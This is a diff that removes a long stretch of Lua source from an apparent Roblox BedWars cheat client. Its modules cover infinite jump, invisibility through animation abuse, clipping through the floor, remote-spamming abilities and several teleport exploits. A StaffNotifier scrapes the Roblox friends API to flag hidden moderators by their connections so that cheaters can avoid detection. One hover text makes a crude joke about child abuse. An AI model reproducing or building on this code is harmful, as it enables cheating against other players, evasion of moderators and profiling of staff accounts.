-		end))
-		
-		isnetworkowner = function(part)
-			if (part == oldcloneroot) or (part == shared.pingbypassroot) or (entityLibrary.isAlive and part == entityLibrary.character.HumanoidRootPart) then
-				return networkownerswitch <= tick()
-			else
-				return false
-			end
-		end
-	end
-
-	local function getStrength2(plr : Player, prediction : Boolean)
-		local inv = bedwars.getInventory(plr)
-		local health = plr.Character:GetAttribute("Health") or 150 + getShieldAttribute(plr.Character)
-		local armor = 0
-		local sword = {
-			sword = {
-				damage = 0.00001,
-				attackSpeed = 0.00001
-			}
-		}
-		local damage = 0
-		if inv then
-			for i,v in next, inv.items do 
-				local itemmeta = bedwars.ItemTable[v.itemType]
-				if itemmeta and itemmeta.sword then
-					local predictedDamage = prediction and ((itemmeta.sword.damage / 100) / swordmeta.sword.attackSpeed) or (itemmeta.sword.damage / 100)
-					if predictedDamage > damage then
-						damage = predictedDamage
-						sword = itemmeta
-					end
-				end	
-			end
-			for i,v in next, inv.armor do
-				local itemmeta = bedwars.ItemTable[v.itemType]
-				if itemmeta and itemmeta.armor then 
-					armor += (itemmeta.armor.damageReductionMultiplier or 0)
-				end
-			end
-		end
-		return armor, sword, health
-	end
-	
-	local function calculateHits(plr : Entity, prediction : Boolean)
-		local armor, sword, health = getStrength2(lplr, prediction)
-		local _armor, _sword, _health = getStrength2(plr, prediction)
-		local hits = math.ceil(_health / (sword.sword.damage * (1 - _armor))) * (prediction and sword.sword.attackSpeed or 1)
-		local _hits = math.ceil(health / (_sword.sword.damage * (1 - armor))) * (prediction and _sword.sword.attackSpeed or 1)
-		return hits < _hits, hits, _hits
-	end
-
-	local Colorize = {}
-	do
-		function Colorize:set(hex : String)
-			return '<font color="#'..hex..'"></font>'
-		end
-		
-		function Colorize:embed(hex : String, ...)
-			local embeds = {...}
-			for i, v in next, embeds do
-				embeds[i] = tostring(v)
-			end
-			return '<font color="#'..hex..'">'..table.concat(embeds, " ")..'</font>'
-		end
-	end
-
-	runFunction(function()
-		local predictionbkg = Instance.new("TextLabel")
-		predictionbkg.Size = UDim2.new(0, 219.05, 0, 16)
-		predictionbkg.Position = UDim2.new(0, 0, 0, 80.5)
-		predictionbkg.BackgroundColor3 = Color3.fromRGB(31, 30, 31)
-		predictionbkg.BackgroundTransparency = 0.25
-		predictionbkg.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
-		local prediction = Instance.new("TextLabel")
-		prediction.Size = UDim2.new(0, 219.05, 0, 24)
-		prediction.Position = UDim2.new(0, 0, 0, 74)
-		prediction.BackgroundColor3 = Color3.fromRGB(31, 30, 31)
-		prediction.Text = '<font color="#32CD32">Winning</font>'
-		prediction.BackgroundTransparency = 1
-		prediction.TextStrokeTransparency = 1
-		prediction.Font = Enum.Font.Arial
-		prediction.TextSize = 19
-		prediction.RichText = true
-		prediction.TextColor3 = Color3.new(205, 205, 205)
-		prediction.TextXAlignment = Enum.TextXAlignment.Center
-		prediction.TextYAlignment = Enum.TextYAlignment.Top
-		prediction.ZIndex = 99
-		prediction.Parent = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo
-		local predictionround = Instance.new("UICorner")
-		predictionround.CornerRadius = UDim.new(0, 4)
-		predictionround.Parent = prediction
-		local oldupdate = vapeTargetInfo.UpdateInfo
-		vapeTargetInfo.UpdateInfo = function(tab, targetsize)
-			local bkgcheck = vapeTargetInfo.Object.GetCustomChildren().Frame.MainInfo.BackgroundTransparency == 1
-			predictionbkg.BackgroundTransparency = bkgcheck and 1 or 0.25
-			pcall(function()
-				for i, v in next, (vapeTargetInfo.Targets) do
-					local areYouWinning = calculateHits(v.Player)
-					prediction.Text = Colorize:embed(areYouWinning and "32CD32" or "FF6464", areYouWinning and "Winning" or "Losing")
-					break
-				end
-			end)
-			return oldupdate(tab, targetsize)
-		end
-	end)
-
-	runFunction(function()
-		local InfiniteJump = {Enabled = false}
-		local InfiniteJumpHold = {Enabled = false}
-
-		InfiniteJump = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-			Name = "InfiniteJump",
-			HoverText = "Jump without touching ground (just like how clutcher got charged without touching those kids)",
-			Function = function(callback)
-				if callback then
-					local held = false
-					table.insert(InfiniteJump.Connections, inputService.InputBegan:Connect(function(input)
-						if input.KeyCode == Enum.KeyCode.Space and not inputService:GetFocusedTextBox() then
-							held = true
-							if entityLibrary.isAlive then
-								if InfiniteJumpHold.Enabled then
-									repeat
-										entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-										task.wait()
-									until not held or not InfiniteJump.Enabled or not InfiniteJumpHold.Enabled or inputService:GetFocusedTextBox()
-								else
-									entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-								end
-							end
-						end
-					end))
-					table.insert(InfiniteJump.Connections, inputService.InputEnded:Connect(function(input)
-						if input.KeyCode == Enum.KeyCode.Space and not inputService:GetFocusedTextBox() then
-							held = false
-						end
-					end))
-				end
-			end
-		})
-		InfiniteJumpHold = InfiniteJump.CreateToggle({
-			Name = "Hold",
-			HoverText = "Hold down space to jump",
-			Function = blankFunction
-		})
-	end)
-
-	runFunction(function()
-		local NoKillFeed = {Enabled = false}
-		local container
-
-		NoKillFeed = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-			Name = "NoKillFeed",
-			HoverText = "Hides the killfeed",
-			Function = function(callback)
-				if callback then
-					task.spawn(function()
-						if container == nil then
-							repeat
-								pcall(function() container = lplr.PlayerGui.KillFeedGui.KillFeedContainer end)
-								task.wait()
-							until container ~= nil or not NoKillFeed.Enabled
-						end
-						container.Visible = false
-					end)
-				else
-					if container then
-						container.Visible = true
-					end
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		local NameHider = {Enabled = true}
-		local fakeplr = {Name = "PROCLUTCHER", UserId = "4949002127"}
-		local otherfakeplayers = {Name = "PROCLUTCHER", UserId = "1"}
-
-		local function sanitizeString(_instance : Instance, property : String)
-			for i,v in next, playersService:GetPlayers() do
-				if v ~= lplr then
-					_instance[property] = _instance[property]:gsub(v.Name, otherfakeplayers.Name)
-					_instance[property] = _instance[property]:gsub(v.DisplayName, otherfakeplayers.Name)
-					_instance[property] = _instance[property]:gsub(v.UserId, otherfakeplayers.UserId)
-				else
-					_instance[property] = _instance[property]:gsub(v.Name, fakeplr.Name)
-					_instance[property] = _instance[property]:gsub(v.DisplayName, fakeplr.Name)
-					_instance[property] = _instance[property]:gsub(v.UserId, fakeplr.UserId)
-				end
-			end
-		end
-
-		local function fixInstance(_instance : Instance)
-			if _instance:IsA("TextLabel") or _instance:IsA("TextButton") then
-				table.insert(NameHider.Connections, _instance:GetPropertyChangedSignal("Text"):Connect(function()
-					sanitizeString(_instance, "Text")
-				end))
-				sanitizeString(_instance, "Text")
-			end
-			if _instance:IsA("ImageLabel") then
-				table.insert(NameHider.Connections, _instance:GetPropertyChangedSignal("Image"):Connect(function()
-					sanitizeString(_instance, "Image")
-				end))
-				sanitizeString(_instance, "Image")
-			end
-		end
-
-		local function cleanDescendants(parent : Instance)
-			for _, _instance in next, parent:GetDescendants() do
-				fixInstance(_instance)
-			end
-			table.insert(NameHider.Connections, parent.DescendantAdded:Connect(fixInstance))
-		end
-
-		NameHider = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "NameHider",
-			HoverText = "Disable TargetHud (And Don't Use Nametags)",
-			Function = function(callback)
-				if callback then
-					cleanDescendants(workspace)
-					cleanDescendants(lplr.PlayerGui)
-					cleanDescendants(coreGui)
-				else
-					singleWarning("Information", "Join a new match to see names normally", 3) -- Not caching names and userids for disabling due to memory overloading + shit preformance
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		local DragonBreath = {Enabled = false}
-		DragonBreath = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-			Name = "DragonBreathSpammer",
-			Function = function(callback)
-				if callback then
-					task.spawn(function()
-						repeat
-							task.wait(0.3)
-							bedwars.ClientHandler:Get("DragonBreath"):SendToServer({player = lplr})
-						until (not DragonBreath.Enabled)
-					end)
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		local PartyPopperFunny = {Enabled = false}
-		PartyPopperFunny = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-			Name = "PartyPopperSpammer",
-			Function = function(callback)
-				if callback then
-					task.spawn(function()
-						repeat
-							task.wait(0.3)
-							useAbility("PARTY_POPPER")
-						until (not PartyPopperFunny.Enabled)
-					end)
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		local fpsunlocker = {Enabled = false}
-		fpsunlocker = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
-			Name = "FpsUnlocker",
-			Function = function(callback)
-				if callback then
-					setfpscap(1000) -- uwp is shit so no one is getting 1k fps while it's focused
-				else
-					setfpscap(100)
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		local FunnyJump = {Enabled = false}
-		FunnyJump = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-			Name = "FunnyHighJump",
-			Function = function(callback)
-				if callback then
-					if entityLibrary.isAlive then
-						workspace.Gravity = 192.6
-						entityLibrary.character.HumanoidRootPart.Velocity += Vector3.new(0, 500, 0)
-						task.wait(0.2)
-						workspace.Gravity = 10
-						task.wait(0.6)
-						workspace.Gravity = 192.6
-					end
-					FunnyJump.ToggleButton(false)
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		local vclip = {Enabled = false}
-		vclip = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
-			Name = "Vclip",
-			Function = function(callback)
-				if callback then
-					if entityLibrary.isAlive then
-						local newpos = entityLibrary.character.HumanoidRootPart.Position - Vector3.new(0, 6, 0)
-						if getPlacedBlock(newpos) == nil then
-							entityLibrary.character.HumanoidRootPart.CFrame -= Vector3.new(0, 6, 0)
-						end
-					end
-					vclip.ToggleButton(false)
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		local night = {Enabled = false}
-		night = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-			Name = "Night",
-			Function = function(callback)
-				if callback then
-					lightingService.TimeOfDay = "00:00:00"
-				else
-					lightingService.TimeOfDay = "13:00:00"
-				end
-			end
-		})
-	end)
-
-	runFunction(function() -- s/o scrxpted
-		local Headless = {Enabled = false}
-		local oldface
-		local function applyHeadless()
-			repeat task.wait() until entityLibrary.isAlive or not Headless.Enabled
-			if entityLibrary.isAlive and Headless.Enabled then
-				entityLibrary.character.Head.Transparency = 1
-				local face = entityLibrary.character.Head:FindFirstChild("face")
-				if face then
-					oldface = face
-					face.Parent = workspace
-				end
-			end
-		end
-
-		Headless = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-			Name = "Headless",
-			Function = function(callback)
-				if callback then
-					table.insert(Headless.Connections, lplr.CharacterAdded:Connect(applyHeadless))
-					task.spawn(applyHeadless)
-				else
-					if entityLibrary.isAlive then
-						entityLibrary.character.Head.Transparency = 0
-						if oldface then
-							oldface.Parent = entityLibrary.character.Head
-							oldface = nil
-						end
-					end
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		local CustomCrosshair = {Enabled = false}
-		local oldicon
-
-		CustomCrosshair = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-			Name = "PROCLUTCHERCrosshair",
-			Function = function(callback)
-				if callback then
-					if localMouse then
-						oldicon = localMouse.Icon
-						localMouse.Icon = "rbxassetid://14525501678"
-						table.insert(CustomCrosshair.Connections, localMouse:GetPropertyChangedSignal("Icon"):Connect(function() -- skidded from daddy engo
-							localMouse.Icon = "rbxassetid://14525501678"
-						end))
-					end
-				else
-					if localMouse and oldicon then
-						localMouse.Icon = oldicon
-						oldicon = nil
-					end
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		local ChatMover = {Enabled = false}
-		local chatApp
-		local oldChatPosition
-
-		ChatMover = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
-			Name = "ChatMover",
-			Function = function(callback)
-				if callback then
-					task.spawn(function()
-						if chatApp == nil then
-							chatApp = coreGui:WaitForChild("ExperienceChat"):WaitForChild("appLayout")
-							local chatWindowApp = chatWindow
-							oldChatPosition = chatApp.Position
-							GuiHandler.dragGui(chatApp, chatWindowApp, function() return ChatMover.Enabled end, "NewChatApp")
-						end
-					end)
-				else
-					if chatApp then
-						chatApp.Position = oldChatPosition or UDim2.new(0, 8, 0, 4)
-						oldChatPosition = nil
-					end
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		local InvisNoCollide = {Enabled = false}
-		local partslist = {}
-	
-		local InvisAnims = {
-			--HANNAH_JUMP_DOWN = "rbxassetid://10725339583", -- HANNAH_JUMP_DOWN [PATCHED]
-			CLETUS_BOSS_SPAWN = "rbxassetid://11198021943", -- CLETUS_BOSS_SPAWN
-			SKELETON_SPAWN = "rbxassetid://11330409797", -- SKELETON_SPAWN
-			HALLOWEEN_BOSS_SPAWN = "rbxassetid://11335949902",  -- HALLOWEEN_BOSS_SPAWN
-		}
-	
-		local animsinvis = {}
-		for i,v in next, InvisAnims do
-			animsinvis[#animsinvis+1] = i
-		end
-	
-		local InvisMethod = {Value = "HALLOWEEN_BOSS_SPAWN"}
-		local newSize = 3
-	
-		local function setCollisions(character, state)
-			if state then
-				RunLoops:UnbindFromStepped("InvisPhase")
-				if entityLibrary.isAlive then
-					for i, v in next, partslist do
-						v.CanCollide = true
-						v.CanTouch = true
-					end
-					table.clear(partslist)
-					character.HumanoidRootPart.Size = Vector3.new(1.9, 2, 1)
-					character.Humanoid.CameraOffset = Vector3.new(0, 0, 0)
-				end
-			else
-				RunLoops:BindToStepped("InvisPhase", function()
-					for _, part in next, character:GetDescendants() do
-						if part:IsA("BasePart") and part ~= character.PrimaryPart and part.CanCollide then
-							part.CanCollide = false
-							part.CanTouch = false
-							table.insert(partslist, part)
-						end
-					end
-					character.Humanoid.CameraOffset = Vector3.new(0, newSize / -2, 0)
-				end)
-				character.HumanoidRootPart.Size = Vector3.new(2, newSize, 1.1)
-			end
-		end
-	
-		local function invisibility(char)
-			if not entityLibrary.isAlive then return nil end
-			local animator = char.Humanoid:WaitForChild("Animator", 5)
-			local function playAnim(id)
-				local anim = Instance.new("Animation", char)
-				anim.AnimationId = id
-				return animator:LoadAnimation(anim)
-			end
-			local anim = playAnim(InvisAnims[InvisMethod.Value])
-			anim.Priority = Enum.AnimationPriority.Action4
-			setCollisions(lplr.Character, false)
-			repeat
-				if not anim.IsPlaying then
-					anim:Play(1 / 999999, 999999, 1 / 999999)
-				end
-				task.wait(1)
-			until not Invis.Enabled or not entityLibrary.isAlive
-			if anim then
-				anim.Looped = false
-				anim:AdjustSpeed(9999)
-				local c
-				c = anim.Ended:Connect(function()
-					c:Disconnect()
-					anim:Destroy()
-				end)
-			end
-			if lplr.Character then
-				setCollisions(lplr.Character, true)
-			end
-		end
-		Invis = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "Invis",
-			Function = function(callback)
-				if callback then
-					task.spawn(function()
-						repeat task.wait() until bedwarsStore.matchState ~= 0
-						local oldchar
-						table.insert(Invis.Connections, lplr.CharacterAdded:Connect(function(char)
-							task.wait(1)
-							char:WaitForChild("Humanoid", 5):WaitForChild("Animator", 5)
-							invisibility(char)
-						end))
-						if lplr.Character then
-							task.wait(1)
-							lplr.Character:WaitForChild("Humanoid", 5):WaitForChild("Animator", 5)
-							invisibility(lplr.Character)
-						end
-					end)
-				end
-			end
-		})
-		InvisMethod = Invis.CreateDropdown({
-			Name = "Method",
-			List = animsinvis,
-			Function = blankFunction,
-			Default = "HALLOWEEN_BOSS_SPAWN"
-		})
-	end)
-
-	runFunction(function()
-		local StaffNotifier = {Enabled = false}
-	
-		local hiddenstaffuids = {
-			1774814725,
-		}
-	
-		local easyggstaff = {
-			46921956,
-			131611316,
-			309677867,
-			541918948,
-			23464867,
-			2061858792,
-			131458969,
-			173472404,
-			132271536,
-			442693739,
-			1068738929,
-			59704814,
-			964088769,
-			39572700,
-			514679433,
-			113328702,
-			654393925,
-			184655415,
-			471937948,
-			2428373515,
-			99721859,
-			139828168,
-			1553470708,
-			2442889283,
-			38951025,
-			22808138,
-			542310559,
-			459722531,
-			44150636,
-			413206749,
-			1162414725,
-			1776734677,
-			78390760,
-			205430552,
-			172603477,
-			34466481,
-			35479046,
-			366613818,
-			3161956759,
-			198131804,
-			3218224169,
-			3856163429,
-			3911023241,
-			3909217779,
-			29238555,
-			3954708742,
-			6782518,
-			4052704069,
-			4061480859,
-			4308133,
-			2237298638,
-			87365146,
-			3288793919,
-			3287652952,
-			3392042820,
-			3361695884,
-			3525652468,
-			281575310,
-			7257763,
-			1548544288,
-			308165,
-			3225386250,
-			1587813840,
-			3778192109,
-			3836307294,
-			20663325,
-			21406719,
-			225721992,
-			4001781,
-			22641473
-		}
-	
-		local queuelist = {}
-	   
-		if isfile("vape/custom/HiddenStaff.json") then
-			hiddenstaffuids = httpService:JSONDecode(readfile("vape/custom/HiddenStaff.json"))
-		else
-			writefile("vape/custom/HiddenStaff.json", httpService:JSONEncode(hiddenstaffuids))
-		end
-	
-		local function saveStaffUids()
-			writefile("vape/custom/HiddenStaff.json", httpService:JSONEncode(hiddenstaffuids))
-		end
-	   
-		local function check_for_staff(plr)
-			if plr == lplr then return end
-			if plr:IsInGroup(5774246) and plr:GetRankInGroup(5774246) >= 100 or table.find(hiddenstaffuids, plr.UserId) then
-				warningNotification("StaffNotifier", (table.find(hiddenstaffuids, plr.UserId) and "Staff connections found\n" or "Staff Detected\n")..(plr.DisplayName and plr.DisplayName.." ("..plr.Name..")" or plr.Name), 20)
-			else
-				table.insert(queuelist, plr.UserId)
-			end
-		end
-
-		task.spawn(function()
-			local oldlistcount = #hiddenstaffuids
-			repeat
-				if #queuelist > 0 then
-					local flwtbl = game:HttpGetAsync("https://friends.roblox.com/v1/users/"..queuelist[1].."/followings")
-					local flwtbl2 = game:HttpGetAsync("https://friends.roblox.com/v1/users/"..queuelist[1].."/friends")
-					local flags = 0
-					if flwtbl.StatusCode == 200 then
-						local decoded = httpService:JSONDecode(flwtbl.Body)
-						for i, info in next, decoded.data do
-							if type(info) == "table" then
-								if table.find(easyggstaff, info.id) then
-									flags += 1
-									break
-								end
-							end
-						end
-					end
-					if flwtbl2.StatusCode == 200 then
-						local decoded2 = httpService:JSONDecode(flwtbl2.Body)
-						for i, info in next, decoded2.data do
-							if type(info) == "table" then
-								if table.find(easyggstaff, info.id) then
-									flags += 1
-									break
-								end
-							end
-						end
-					end
-					if flags > 0 then
-						table.insert(hiddenstaffuids, queuelist[1])
-						saveStaffUids()
-					end
-					table.remove(queuelist, 1)
-				end
-				if #hiddenstaffuids > oldlistcount then
-					for i, plr in next, (playersService:GetChildren()) do
-						task.spawn(check_for_staff, plr)
-					end
-				end
-				oldlistcount = #hiddenstaffuids
-				task.wait(1.4)
-			until not _VapeApi.vapeInjected
-		end)
-	
-		StaffNotifier = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "StaffNotifier",
-			Function = function(callback)
-				if callback then
-					table.insert(StaffNotifier.Connections, playersService.PlayerAdded:Connect(check_for_staff))
-					table.insert(StaffNotifier.Connections, playersService.PlayerRemoving:Connect(function(plr)
-						if plr == lplr then return end
-						local plr = plr
-						if plr and plr:IsInGroup(5774246) or table.find(hiddenstaffuids, plr.UserId) then
-							if plr:GetRankInGroup(5774246) >= 100 or table.find(hiddenstaffuids, plr.UserId) then
-								warningNotification("StaffNotifier", "Staff Left\n"..(plr.DisplayName and plr.DisplayName.." ("..plr.Name..")" or plr.Name), 20)
-							end
-						end
-					end))
-					for i, plr in next, (playersService:GetChildren()) do
-						task.spawn(check_for_staff, plr)
-					end
-				end
-			end
-		})
-	end)
-
-	runFunction(function()
-		ReducePackets = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
-			Name = "ReducePackets",
-			Function = function(callback) end
-		})
-		ReduceKillAura = ReducePackets.CreateToggle({
-			Name = "Killaura",
-			Function = blankFunction
-		})
-		ReduceAutoBuy = ReducePackets.CreateToggle({
-			Name = "AutoBuy",
-			Function = blankFunction
-		})
-		ReduceAutoBank = ReducePackets.CreateToggle({
-			Name = "AutoBank",
-			Function = blankFunction
-		})
-		ReduceChestStealer = ReducePackets.CreateToggle({
-			Name = "ChestStealer",
-			Function = blankFunction
-		})
-		ReduceDisabler = ReducePackets.CreateToggle({
-			Name = "Disabler",
-			Function = blankFunction
-		})
-	end)
-
-	runFunction(function()
-		local Teleport = {Enabled = false}
-		local TeleportMethod = {Value = "Redirect"}
-		local TeleportMode = {Value = "Bed"}
-		local TeleportPlayerSort = {Value = "Distance"}
-		local TeleportSpeed = {Value = 800}
-	
-		local function getNearestBed(Self : Boolean, overridepos : Vector3)
-			local bed, distance = nil, math.huge
-			if entityLibrary.isAlive then
-				for i, obj in next, collectionService:GetTagged("bed") do
-					if obj.Parent ~= nil then
-						if bedwars.BlockController:isBlockBreakable({blockPosition = obj.Position / 3}, lplr) then
-							local mag = (overridepos or entityLibrary.LocalPosition or entityLibrary.character.HumanoidRootPart.Position).magnitude
-							if mag < distance then
-								bed = obj
-								distance = mag
-							end
-						else
-							if Self then
-								bed = obj
-								distance = -1
-								break
-							end
-						end
-					end
-				end
-			end
-			return bed
-		end
-	
-		local function calculateTime(Distance : Number, Speed : Number)
-			return Distance / Speed
-		end
-
-		local function safeTeleport(position)
-			return not (getPlacedBlock(position) and getPlacedBlock(position + Vector3.new(0, 3, 0)))
-		end
-
-		local function keepRotations(position)
-			local origcf = {entityLibrary.character.HumanoidRootPart.CFrame:GetComponents()}
-			origcf[1] = position.X
-			origcf[2] = position.Y
-			origcf[3] = position.Z
-			local newcf = CFrame.new(unpack(origcf))
-			entityLibrary.character.HumanoidRootPart.CFrame = newcf
-			return newcf
-		end
-
-		local function keepRotations2(y)
-			local origcf = {entityLibrary.character.HumanoidRootPart.CFrame:GetComponents()}
-			origcf[2] = y
-			local newcf = CFrame.new(unpack(origcf))
-			entityLibrary.character.HumanoidRootPart.CFrame = newcf
-			return newcf
-		end
-
-		local function rotateTo(position)
-			local newcf = CFrame.lookAt(entityLibrary.character.HumanoidRootPart.Position, position)
-			entityLibrary.character.HumanoidRootPart.CFrame = newcf
-			return newcf
-		end
-
-		local projectileRemote = bedwars.ClientHandler:Get(bedwars.ProjectileRemote)
-
-		local function pearlTeleport(position)
-			local telepearl = getItem("telepearl")
-			if telepearl then
-				switchItem(telepearl.tool)
-				local tag = httpService:GenerateGUID()
-				local ammo = "telepearl"
-				local launchpos = position + Vector3.new(0, 3, 0)
-				local launchvelo = Vector3.new(0, -1, 0)
-				projectileRemote:CallServerAsync(telepearl.tool, ammo, ammo, launchpos, launchpos, launchvelo, tag, { drawDurationSeconds = 3 }, workspace:GetServerTimeNow() - 0.045)
-				task.spawn(function()
-					task.wait(0.2)
-					local newray = workspace:Raycast(launchpos, Vector3.new(0, -15, 0), bedwarsStore.blockRaycast)
-					if newray then
-						for i = 1, 3 do
-							bedwars.ClientHandler:Get(bedwars.Main.ProjectileHitRemote):SendToServer(tag, newray.Instance)
-						end
-					end
-				end)
-				return true
-			end
-			return false
-		end
-
-		local function getStrength(plr)
-			local inv = bedwarsStore.inventories[plr.Player]
-			local strength = 0
-			local strongestsword = 0
-			if inv then
-				for i, v in next, inv.items do 
-					local itemmeta = bedwars.ItemTable[v.itemType]
-					if itemmeta and itemmeta.sword and itemmeta.sword.damage > strongestsword then 
-						strongestsword = itemmeta.sword.damage / 100
-					end	
-				end
-				strength = strength + strongestsword
-				for i, v in next, inv.armor do 
-					local itemmeta = bedwars.ItemTable[v.itemType]
-					if itemmeta and itemmeta.armor then 
-						strength = strength + (itemmeta.armor.damageReductionMultiplier or 0)
-					end
-				end
-				strength = strength
-			end
-			return strength
-		end
-
-		local function getItemWealth(plr)
-			local inv = bedwarsStore.inventories[plr.Player]
-			local wealth = 0
-			if inv then
-				for i,v in next, inv.items do 
-					if v.itemType == "emerald" then
-						wealth += v.amount * 4
-					elseif v.itemType == "diamond" then
-						wealth += v.amount * 2
-					elseif v.itemType == "iron" then
-						wealth +=  v.amount
-					end
-				end
-			end
-			return wealth
-		end
-	
-		local function getArmorWealth(plr)
-			local inv = bedwarsStore.inventories[plr.Player]
-			local wealth = 0
-			if inv then
-				for i, v in next, inv.armor do 
-					local itemmeta = bedwars.ItemTable[v.itemType]
-					if itemmeta and itemmeta.armor then 
-						wealth += itemmeta.armor.damageReductionMultiplier or 0
-					end
-				end
-			end
-			return wealth
-		end
-	
-		local kitpriolist = {
-			hannah = 5,
-			spirit_assassin = 4,
-			dasher = 3,
-			jade = 2,
-			regent = 1
-		}
-	
-		local teleportSortMethods = {
-			Distance = function(a, b)
-				return (a.RootPart.Position - entityLibrary.character.HumanoidRootPart.Position).Magnitude < (b.RootPart.Position - entityLibrary.character.HumanoidRootPart.Position).Magnitude
-			end,
-			Health = function(a, b) 
-				return a.Humanoid.Health < b.Humanoid.Health
-			end,
-			Threat = function(a, b) 
-				return getStrength(a) > getStrength(b)
-			end,
-			Wealth = function(a, b)
-				return getItemWealth(a) > getItemWealth(b)
-			end,
-			Weakest = function(a, b)
-				return getStrength(a) < getStrength(b)
-			end,
-			Kit = function(a, b)
-				return (kitpriolist[a.Player:GetAttribute("PlayingAsKit")] or 0) > (kitpriolist[b.Player:GetAttribute("PlayingAsKit")] or 0)
-			end,
-
-		}
-
-		local teleportMethods = {
-			Redirect = function(position)
-				if bedwarsStore.matchState ~= 0 then
-					if getNearestBed(true) then
-						bedwars.ClientHandler:Get(bedwars.ResetRemote):SendToServer()
-					end
-				end
-				lplr:GetAttributeChangedSignal("LastTeleported"):Wait()
-				repeat task.wait() until entityLibrary.isAlive
-				-- yes yes yes I loooooove using tweenService - scrxpted
-				keepRotations2(10000)
-				local newpos = fixVec(entityLibrary.character.HumanoidRootPart.Position)
-				local newpos2 = fixVec(position)
-				local teleportTween = tweenService:Create(entityLibrary.character.HumanoidRootPart, TweenInfo.new(calculateTime((newpos2 - newpos).Magnitude, TeleportSpeed.Value), Enum.EasingStyle.Linear, Enum.EasingDirection.In), {CFrame = CFrame.new(newpos2)})
-				teleportTween:Play()
-				lplr:GetAttributeChangedSignal("LastTeleported"):Once(function()
-					teleportTween:Cancel()
-				end)
-				teleportTween.Completed:Wait()
-				keepRotations2(position.Y)
-			end,
-			Dao = function(position)
-				local item = getItemNear("dao")
-				if item then
-					position -= Vector3.new(0, 1, 0)
-					local rotation = rotateTo(position)
-					local oldpos = entityLibrary.character.HumanoidRootPart.Position
-					useAbility("dash", {
-						direction = rotation.lookVector,
-						origin = entityLibrary.character.HumanoidRootPart.Position,
-						weapon = item.itemType,
-					})
-					keepRotations(entityLibrary.character.HumanoidRootPart.CFrame, position)
-					task.wait(0.03)
-					if isnetworkowner(entityLibrary.character.HumanoidRootPart) then
-						warningNotification("Teleport", `Teleported {(oldpos - entityLibrary.character.HumanoidRootPart.Position).Magnitude} studs`, 10)
-					end
-				end
-			end,
-			Jade = function(position)
-				if getItem("jade_hammer") then
-					position -= Vector3.new(0, 1, 0)
-					rotateTo(position)
-					local oldpos = entityLibrary.character.HumanoidRootPart.Position
-					useAbility("jade_hammer_jump")
-					keepRotations(entityLibrary.character.HumanoidRootPart.CFrame, position)
-					task.wait(0.03)
-					if isnetworkowner(entityLibrary.character.HumanoidRootPart) then
-						warningNotification("Teleport", `Teleported {(oldpos - entityLibrary.character.HumanoidRootPart.Position).Magnitude} studs`, 10)
-					end
-				end
-			end,
-			Telepearl = function(position)
-				warningNotification("Teleport", pearlTeleport(position) and "Success" or "No telepearl", 5)
-			end
-		}
-
-		local teleportModes = {
-			Bed = function(selfBed)
-				local bed = getNearestBed(false, selfBed and selfBed.Position)
-				if bed then
-					local newray = bedwars.QueryUtil:raycast(bed.Position + Vector3.new(0, 100, 0), Vector3.new(0, -200, 0), bedwarsStore.blockRaycast)
-					if newray then
-						return newray.Position
-					end
-				else
-					warningNotification("Teleport", "no beds found", 5)
-				end
-			end,
-			Click = function(selfBed)
-				local rayparams = RaycastParams.new()
-				rayparams.FilterDescendantsInstances = {lplr.Character, gameCamera, bedwarsStore.bedwarsBlocks}
-				rayparams.RespectCanCollide = true
-				local hitposition = localMouse.Hit
-				if hitposition then
-					local newray = bedwars.QueryUtil:raycast(gameCamera.CFrame.p, (hitposition.p - gameCamera.CFrame.p).Unit * 10000, rayparams)
-					if newray then
-						if safeTeleport(newray.Position) then
-							return newray.Position
-						else
-							newray = bedwars.QueryUtil:raycast(hitposition.p + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
-							if newray then
-								return newray.Position
-							else
-							end
-						end
-					end
-				end
-			end,
-			Player = function(selfBed)
-				local plrs = AllNearPosition(999999, 1, teleportSortMethods[TeleportPlayerSort.Value], true, nil, true)
-				if #plrs > 0 then
-					for i, plr in pairs(plrs) do
-						if safeTeleport(plr.RootPart.Position) then
-							return plr.RootPart.Position
-						else
-							local newray = bedwars.QueryUtil:raycast(plr.RootPart.Position + Vector3.new(0, 800, 0), Vector3.new(0, -1000, 0), bedwarsStore.blockRaycast)
-							if newray then
-								return newray.Position
-							end
-						end
-					end
-					table.clear(plrs)
-				else
-					singleWarning("Teleport", "no players found", 5)
-				end
-			end
-		}
-	
